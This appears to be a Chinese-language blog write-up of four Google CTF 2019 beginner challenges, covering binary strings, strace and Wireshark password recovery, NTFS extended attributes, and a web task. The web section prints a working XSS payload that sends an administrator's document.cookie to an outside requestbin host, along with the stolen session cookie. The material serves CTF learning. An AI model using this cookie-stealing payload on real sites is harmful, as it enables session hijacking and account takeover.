---
title: goolge ctf 2019 beginners writeup_part_1
date: 2019-10-2 12:13:02
tags:
- ctf
- hacker
categories:
- [ctf]
- [hacker]
---

## 01 Enter Space-Time Coordinates(misc)

- 下载zip压缩包解压，得到log.txt and rand2，进行查看

```bash
➜ attachment cat log.txt

0: AC+79 3888{6652492084280_198129318435598}
1: Pliamas Sos{276116074108949_243544040631356}
2: Ophiuchus{11230026071572_273089684340955}
3: Pax Memor -ne4456 Hi Pro{21455190336714_219250247519817}
4: Camion Gyrin{235962764372832_269519420054142}

➜ attachment file rand2

rand2: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=0208fc60863053462fb733436cef1ed23cb6c78f, not stripped
```

- 执行rand2

```bash
➜ attachment ./rand2

Travel coordinator
0: AC+79 3888 - 95603467253307, 47507421386467
1: Pliamas Sos - 192115414361300, 250197841279970
2: Ophiuchus - 51512207753664, 34661227854198
3: Pax Memor -ne4456 Hi Pro - 235082830098621, 202860065631117
4: Camion Gyrin - 66299664563594, 223065406793793 
5: CTF - <REDACTED>

Enter your destination's x coordinate:
>>>
```

- 看到 CTF - <REDACTED> ，log里面也没有坐标信息，尝试利用strings命令查看源码并搜索CTF

```bash
➜ attachment strings ./rand2 | grep CTF

Arrived at the flag. Congrats, your flag is: CTF{welcome_to_googlectf}
```

- ==**flag：CTF{welcome_to_googlectf}**==

## 02 Satellite(networking)

- 下载压缩包解压得到：init_sat、readme.pdf
- 查看redeme.pdf,获取图片中“osmium"
- 查看init_sat文件类型

```bash 
➜ 02_Satellite file init_sat

init_sat: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, not stripped
```

- 执行init_sat,并输入“osmium",按照指示得到

```bash
➜ 02_Satellite ./init_sat

Hello Operator. Ready to connect to a satellite?
Enter the name of the satellite to connect to or 'exit' to quit
osimum
Unrecognized satellite: osimum

Enter the name of the satellite to connect to or 'exit' to quit
osmium
Establishing secure connection to osmium
 satellite...
Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect

a
Username: brewtoot password: ********************       166.00 IS-19 2019/05/09 00:00:00Swath 640km     Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m        Daily acquisition capacity: 220,000km²  Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E
```

- 可以察觉password：************，有可能是flag。最后给的网址也许同样有线索
- 打开网址得到一字符串，观察可是应为base64加密

```txt
VXNlcm5hbWU6IHdpcmVzaGFyay1yb2NrcwpQYXNzd29yZDogc3RhcnQtc25pZmZpbmchCg==
```

- 对字符串进行解码。并没有得到flag

```bash
➜ 02_Satellite echo 'VXNlcm5hbWU6IHdpcmVzaGFyay1yb2NrcwpQYXNzd29yZDogc3RhcnQtc25pZmZpbmchCg=='| base64 -d

Username: wireshark-rocks
Password: start-sniffing!
```

- 方法一：根据提示，利用wireshark可以截获password明文

```txt
0000   00 0c 29 e9 77 9f 00 50 56 fd 49 f6 08 00 45 00   ..)éw..PVýIö..E.
0010   01 93 02 05 00 00 80 06 9e cc 22 4c 65 1d c0 a8   .........Ì"Le.À¨
0020   50 82 05 39 e5 9e 28 e0 1a 57 cb 95 5d b1 50 18   P..9å.(à.WË.]±P.
0030   fa f0 3a 91 00 00 55 73 65 72 6e 61 6d 65 3a 20   úð:...Username: 
0040   62 72 65 77 74 6f 6f 74 20 70 61 73 73 77 6f 72   brewtoot passwor
0050   64 3a 20 43 54 46 7b 34 65 66 63 63 37 32 30 39   d: CTF{4efcc7209
0060   30 61 66 32 38 66 64 33 33 61 32 31 31 38 39 38   0af28fd33a211898
0070   35 35 34 31 66 39 32 65 37 39 33 34 37 37 66 7d   5541f92e793477f}
0080   09 31 36 36 2e 30 30 20 49 53 2d 31 39 20 32 30   .166.00 IS-19 20
0090   31 39 2f 30 35 2f 30 39 20 30 30 3a 30 30 3a 30   19/05/09 00:00:0
00a0   30 09 53 77 61 74 68 20 36 34 30 6b 6d 09 52 65   0.Swath 640km.Re
00b0   76 69 73 69 74 20 63 61 70 61 63 69 74 79 20 74   visit capacity t
00c0   77 69 63 65 20 64 61 69 6c 79 2c 20 61 6e 79 77   wice daily, anyw
00d0   68 65 72 65 20 52 65 73 6f 6c 75 74 69 6f 6e 20   here Resolution 
00e0   70 61 6e 63 68 72 6f 6d 61 74 69 63 3a 20 33 30   panchromatic: 30
00f0   63 6d 20 6d 75 6c 74 69 73 70 65 63 74 72 61 6c   cm multispectral
0100   3a 20 31 2e 32 6d 09 44 61 69 6c 79 20 61 63 71   : 1.2m.Daily acq
0110   75 69 73 69 74 69 6f 6e 20 63 61 70 61 63 69 74   uisition capacit
0120   79 3a 20 32 32 30 2c 30 30 30 6b 6d c2 b2 09 52   y: 220,000kmÂ².R
0130   65 6d 61 69 6e 69 6e 67 20 63 6f 6e 66 69 67 20   emaining config
0140   64 61 74 61 20 77 72 69 74 74 65 6e 20 74 6f 3a   data written to:
0150   20 68 74 74 70 73 3a 2f 2f 64 6f 63 73 2e 67 6f    https://docs.go
0160   6f 67 6c 65 2e 63 6f 6d 2f 64 6f 63 75 6d 65 6e   ogle.com/documen
0170   74 2f 64 2f 31 34 65 59 50 6c 75 44 5f 70 69 33   t/d/14eYPluD_pi3
0180   38 32 34 47 41 46 61 6e 53 32 39 74 57 64 54 63   824GAFanS29tWdTc
0190   4b 78 50 5f 58 55 78 78 37 65 33 30 33 2d 33 45   KxP_XUxx7e303-3E
01a0   0a                                                .

```

- 方法二：思路转向password的明文。直接通过文本工具打开init_sat源码并不能查看到flag信息。尝试通过strace进行调试。
-f 显示产生的子进程
-s 需要显示的字符串长度
-e 定位的参数，recv\read\write ...

```bash
➜ 02_Satellite strace -f -s 12345 -e trace=recv,read ./init_sat

read(3, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0000b\0\0\0\0\0\0@\0\0\0\0\0\0\0P,\2\0\0\0\0\0\0\0\0\0@\0008\0\t\0@\0(\0'\0\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0\370\1\0\0\0\0\0\0\370\1\0\0\0\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\4\0\0\0PM\1\0\0\0\0\0PM\1\0\0\0\0\0PM\1\0\0\0\0\0\34\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\20\0\0\0\0\0\0\0\1\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\20\223\1\0\0\0\0\0\20\223\1\0\0\0\0\0\0\0 \0\0\0\0\0\1\0\0\0\6\0\0\0\240\233\1\0\0\0\0\0\240\233!\0\0\0\0\0\240\233!\0\0\0\0\0P\7\0\0\0\0\0\0\340H\0\0\0\0\0\0\0\0 \0\0\0\0\0\2\0\0\0\6\0\0\0h\235\1\0\0\0\0\0h\235!\0\0\0\0\0h\235!\0\0\0\0\0000\2\0\0\0\0\0\0000\2\0\0\0\0\0\0\10\0\0\0\0\0\0\0\4\0\0\0\4\0\0\0008\2\0\0\0\0\0\0008\2\0\0\0\0\0\0008\2\0\0\0\0\0\0D\0\0\0\0\0\0\0D\0\0\0\0\0\0\0\4\0\0\0\0\0\0\0P\345td\4\0\0\0pM\1\0\0\0\0\0pM\1\0\0\0\0\0pM\1\0\0\0\0\0\344\10\0\0\0\0\0\0\344\10\0\0\0\0\0\0\4\0\0\0\0\0\0\0Q\345td\6\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0\0\0\0\0R\345td\4\0\0\0\240\233\1\0\0\0\0\0\240\233!\0\0\0\0\0\240\233!\0\0\0\0\0`\4\0\0\0\0\0\0`\4\0\0\0\0\0\0\1\0\0\0\0\0\0\0\4\0\0\0\24\0\0\0\3\0\0\0GNU\0(\306\252\336p\262\324\r\37\17=\n\32\f\255\32\270\26D\217\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\345\1\0\0[\0\0\0 \0\0\0\v\0\0\0\31#\2\261\1\10\20\2@@a\370\3\10\10\25\200 \0\0\0\0\200\300\321Q\0\0\0\22\353\3020D\0\10\20A\0\2\0\2\f\1\200\v\221\1\330\240\r\240@\230 \244\200\21\n\202-l@g\214V\24\0\224 \200$H\200P(\1\22\f\311B\240\220\22\10\f \2ZdA\245c\4@\n\n\n\0\2009\1(\314D\204\201\300\22\10(\fD\0\0\0\200Q\10\200\35\4B\320\2608A\0\1\0\0\265\0300\0\200`\2\20\"\0\tA\20\1\5\0P(\251\22G(\0\0\202\4\230@\4\0\20\340T\0\2@\2\2\20\3010f\26\200\0", 832) = 832
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\260\34\2\0\0\0\0\0@\0\0\0\0\0\0\0\220\351\36\0\0\0\0\0\0\0\0\0@\0008\0\n\0@\0I\0H\0\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0000\2\0\0\0\0\0\0000\2\0\0\0\0\0\0\10\0\0\0\0\0\0\0\3\0\0\0\4\0\0\0P\335\33\0\0\0\0\0P\335\33\0\0\0\0\0P\335\33\0\0\0\0\0\34\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\20\0\0\0\0\0\0\0\1\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240j\36\0\0\0\0\0\240j\36\0\0\0\0\0\0\0 \0\0\0\0\0\1\0\0\0\6\0\0\0 v\36\0\0\0\0\0 v>\0\0\0\0\0 v>\0\0\0\0\0@R\0\0\0\0\0\0\300\224\0\0\0\0\0\0\0\0 \0\0\0\0\0\2\0\0\0\6\0\0\0\200\253\36\0\0\0\0\0\200\253>\0\0\0\0\0\200\253>\0\0\0\0\0\340\1\0\0\0\0\0\0\340\1\0\0\0\0\0\0\10\0\0\0\0\0\0\0\4\0\0\0\4\0\0\0p\2\0\0\0\0\0\0p\2\0\0\0\0\0\0p\2\0\0\0\0\0\0D\0\0\0\0\0\0\0D\0\0\0\0\0\0\0\4\0\0\0\0\0\0\0\7\0\0\0\4\0\0\0 v\36\0\0\0\0\0 v>\0\0\0\0\0 v>\0\0\0\0\0\20\0\0\0\0\0\0\0\220\0\0\0\0\0\0\0\10\0\0\0\0\0\0\0P\345td\4\0\0\0l\335\33\0\0\0\0\0l\335\33\0\0\0\0\0l\335\33\0\0\0\0\0\334Y\0\0\0\0\0\0\334Y\0\0\0\0\0\0\4\0\0\0\0\0\0\0Q\345td\6\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\20\0\0\0\0\0\0\0R\345td\4\0\0\0 v\36\0\0\0\0\0 v>\0\0\0\0\0 v>\0\0\0\0\0\3409\0\0\0\0\0\0\3409\0\0\0\0\0\0\1\0\0\0\0\0\0\0\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\264\27\300\272|\305\317\6\321\321\276\326e,\355\271%<`\320\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\3\0\0\0\2\0\0\0\0\0\0\0\0\0\0\0\363\3\0\0\n\0\0\0\0\1\0\0\16\0\0\0\0000\20D\240 \2\1\210\3\346\220\305E\214\0\304\0X\0\7\204\0p\302\200\0\r\212\fA\4\20\0\210@2\10*@\210T<- \0162H&\204\300\214\4\10\0\2\2\16\241\254\32\6f\310\0\3002\0\300\4P\t \201\10\204\v  ($\0\4 Z\0\20X\200\312DB(\0\6\200\0208C\0 @\200\0IP\0Q\212@\22\0\0\0\0\10\0\0\21\20", 832) = 832
strace: Process 188 attached
strace: Process 189 attached
strace: Process 190 attached
strace: Process 191 attached
strace: Process 192 attached
Hello Operator. Ready to connect to a satellite?
Enter the name of the satellite to connect to or 'exit' to quit
[pid   187] read(0, osmium
"osmium\n", 4096)   = 7
Establishing secure connection to osmium
 satellite...
[pid   187] read(3, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference' and `info' packages installed, try:\n# `info libc \"Name Service Switch\"' for information about this file.\n\npasswd:         compat systemd\ngroup:          compat systemd\nshadow:         compat\ngshadow:        files\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 1024) = 513
[pid   187] read(3, "", 1024)           = 0
[pid   187] read(3, "# This file was automatically generated by WSL. To stop automatic generation of this file, remove this line.\nnameserver 172.16.23.168\nnameserver 172.16.23.131\nnameserver fec0:0:0:ffff::1\n", 65536) = 187
[pid   187] read(3, "", 65349)          = 0
[pid   187] read(3, "", 65536)          = 0
[pid   187] read(3, "# This file is automatically generated by WSL based on the Windows hosts file:\n# %WINDIR%\\System32\\drivers\\etc\\hosts. Modifications to this file will be overwritten.\n127.0.0.1\tlocalhost\n127.0.1.1\tDESKTOP-ARC2CM5.localdomain\tDESKTOP-ARC2CM5\n127.0.0.1\twww.xmind.com\n127.0.0.1\txmind.com\n127.0.0.1\twww.xmind.net\n127.0.0.1\txmind.net\n\n# The following lines are desirable for IPv6 capable hosts\n::1     ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n", 65536) = 512 [pid   187] read(3, "", 65024)          = 0
[pid   187] read(3, "", 65536)          = 0
strace: Process 193 attached
[pid   187] read(3, 0xc000126000, 512)  = -1 EAGAIN (Resource temporarily unavailable)
[pid   191] read(5, 0xc000128000, 512)  = -1 EAGAIN (Resource temporarily unavailable)
[pid   187] read(3, "cJ\201\200\0\1\0\0\0\1\0\0\tsatellite\16ctfcompetition\3com\0\0\34\0\1\300\26\0\6\0\1\0\0\1,\0N\vns-cloud-b1\rgoogledomains\300%\24cloud-dns-hostmaster\6google\300%\0\0\0\1\0\0T`\0\0\16\20\0\3\364\200\0\0\1,", 512) = 136
[pid   193] read(5, "\321w\201\200\0\1\0\1\0\0\0\0\tsatellite\16ctfcompetition\3com\0\0\1\0\1\300\f\0\1\0\1\0\0\0<\0\4\"Le\35", 512) = 62
[pid   187] read(3, 0xc00013e000, 4096) = -1 EAGAIN (Resource temporarily unavailable)
[pid   187] read(3, "Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect\n\n", 4096) = 87
Welcome. Enter (a) to display config data, (b) to erase all data or (c) to disconnect

[pid   187] read(0, a
"a\n", 4096)        = 2
[pid   187] read(3, 0xc000163000, 4096) = -1 EAGAIN (Resource temporarily unavailable)
[pid   193] read(3, "Username: brewtoot password: CTF{4efcc72090af28fd33a2118985541f92e793477f}\t166.00 IS-19 2019/05/09 00:00:00\tSwath 640km\tRevisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m\tDaily acquisition capacity: 220,000km\302\262\tRemaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E\n", 4096) = 363
Username: brewtoot password: ********************     166.00 IS-19 2019/05/09 00:00:00                            Swath 640km      Revisit capacity twice daily, anywhere Resolution panchromatic: 30cm multispectral: 1.2m          Daily acquisition capacity: 220,000km²   Remaining config data written to: https://docs.google.com/document/d/14eYPluD_pi3824GAFanS29tWdTcKxP_XUxx7e303-3E

[pid   193] read(0,
```

- pid 193进程read中，password明文显示flag
- ==**flag：CTF{4efcc72090af28fd33a2118985541f92e793477f}**==

## 03 home computer(forensics)

- forensics:取证
- 解压得到 note.txt、 family.ntfs
- 加载family.ntfs有两种方法：
- 方法一：7.zip
（支援的檔案格式：压缩／解压缩：7z、XZ、BZIP2、GZIP、TAR、ZIP 及 WIM//解压缩：AR、ARJ、CAB、CHM、CPIO、CramFS、DMG、EXT、FAT、GPT、HFS、IHEX、ISO、LZH、LZMA、MBR、MSI、NSIS、NTFS、QCOW2、RAR、RPM、SquashFS、UDF、UEFI、VDI、VHD、VMDK、WIM、XAR 及 Z)

- 方法二：linux 挂载(kali)

```bash
⚡ root@r10 mount -t ntfs ./family.ntfs /mnt
```

- 进入路径：/mnt/Users/Family/Documents ，查看credentials.txt

```bash
⚡ root@r10 cat credentials.txt

I keep pictures of my credentials in extended attributes.
```

- 利用attr查看扩展文件

```bash
⚡ root@r10 attr -l credentials.txt 
Attribute "FILE0" has a 38202 byte value for credentials.txt
⚡ root@r10 attr -g  FILE0 -q credentials.txt > flag
⚡ root@r10 file flag
flag: PNG image data, 1234 x 339, 8-bit/color RGB, non-interlaced
```

- 利用getfattr查看扩展文件

```bash
⚡ root@r10 getfattr credentials.txt  
# file: credentials.txt
user.FILE0
⚡ root@r10 getfattr --only-values credentials.txt > image.png
```

- 查看图片得到flag

```bash
⚡ root@r10 eog flag
```

- ==**flag：CTF{congratsyoufoundmycreds}**==

## 04 Government Agriculture Network(web)

- 目标页面https://govagriculture.web.ctfcompetition.com/
- 尝试Create a new post，得到信息：Your post was submitted for review. Administator will take a look shortly.
- 分析：administator再次登录将留下cookie，尝试xss攻击
- 利用http://requestbin.net/ 构建requset.（hettp://webhook.site亦可）
- Make a request to get started

```php
<?php
    $result = file_get_contents('http://requestbin.net/r/15ietu11');
    echo $result;
?>
```

- xss注入

```js
<script>
location.href='http://requestbin.net/r/14bfl601?test='+document.cookie;
</script>
```

- 查看request信息，得到flag

```txt
test: flag=CTF{8aaa2f34b392b415601804c2f5f0f24e}; session=HWSuwX8784CmkQC1Vv0BXETjyXMtNQrV
```

- ==**flag：CTF{8aaa2f34b392b415601804c2f5f0f24e}**==
